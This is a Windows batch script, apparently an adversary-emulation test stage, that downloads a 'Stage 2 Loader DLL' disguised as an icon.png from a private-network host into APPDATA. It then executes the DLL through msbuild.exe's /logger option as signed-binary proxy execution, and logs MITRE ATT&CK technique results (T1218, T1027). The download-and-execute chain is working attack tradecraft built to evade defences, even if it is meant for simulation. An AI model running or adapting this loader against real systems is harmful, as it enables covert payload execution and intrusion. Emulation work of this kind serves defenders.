@echo off
SETLOCAL ENABLEDELAYEDEXPANSION

REM ===== PHR_ placeholder assignments (random variable names) =====
SET akjdhm=%APPDATA%\10401\69ae9fae
SET qwzxpl=c050a49b.txt
SET mnbvfg=https://10.0.0.49/stage/2/icon.png?10401-7
SET plkmjv=ITZEL-S2BO
SET vbnmcx=10401
SET ghzxpq=7

REM ===== Cache timestamp once =====
SET tsvar=!DATE!/!TIME!

REM ===== Log file path =====
SET logvar=%APPDATA%\!ghzxpq!\macula-simulations.log

REM ===== Debug: heartbeat start =====
echo [!tsvar!][DEBUG][!plkmjv!][!vbnmcx!]: heartbeat_start>> "!logvar!" 2>nul

REM ===== Step 1: Heartbeat fetch (download Stage 2 Loader DLL) =====
curl -k -s -o "!akjdhm!\!qwzxpl!" "!mnbvfg!"
IF ERRORLEVEL 1 (
    echo [!tsvar!][DEBUG][!plkmjv!][!vbnmcx!]: heartbeat_failed>> "!logvar!" 2>nul
    exit /b 1
) ELSE (
    echo [!tsvar!][DEBUG][!plkmjv!][!vbnmcx!]: heartbeat_complete>> "!logvar!" 2>nul
)

REM ===== Step 2: Change directory =====
echo [!tsvar!][DEBUG][!plkmjv!][!vbnmcx!]: chdir_start>> "!logvar!" 2>nul
cd /d "!akjdhm!" >nul 2>&1
echo [!tsvar!][DEBUG][!plkmjv!][!vbnmcx!]: chdir_result=!ERRORLEVEL!>> "!logvar!" 2>nul

REM ===== Step 3: Create dummy .proj file =====
echo ^<Project/^> > "build.proj" 2>nul

REM ===== Step 4: Invoke msbuild with /logger: =====
echo [!tsvar!][DEBUG][!plkmjv!][!vbnmcx!]: msbuild_start>> "!logvar!" 2>nul
%SystemRoot%\Microsoft.NET\Framework64\v4.0.30319\msbuild.exe "build.proj" /logger:LoggerEntry,"!qwzxpl!";MyParameters,Foo >NUL 2>&1
IF ERRORLEVEL 1 (
    echo [!tsvar!][DEBUG][!plkmjv!][!vbnmcx!]: msbuild_failed>> "!logvar!" 2>nul
    echo [!tsvar!][TTP][!plkmjv!][!vbnmcx!]: T1218|System Binary Proxy Execution=[FAIL]:[msbuild_failed]>> "!logvar!" 2>nul
) ELSE (
    echo [!tsvar!][DEBUG][!plkmjv!][!vbnmcx!]: msbuild_complete>> "!logvar!" 2>nul
    echo [!tsvar!][TTP][!plkmjv!][!vbnmcx!]: T1218|System Binary Proxy Execution=[OK]:[]>> "!logvar!" 2>nul
)

REM ===== Step 5: Log obfuscation pass (T1027) =====
echo [!tsvar!][DEBUG][!plkmjv!][!vbnmcx!]: obfuscation_applied>> "!logvar!" 2>nul
echo [!tsvar!][TTP][!plkmjv!][!vbnmcx!]: T1027|Obfuscated Files or Information=[OK]:[]>> "!logvar!" 2>nul

REM ===== Exit cleanly =====
exit /b 0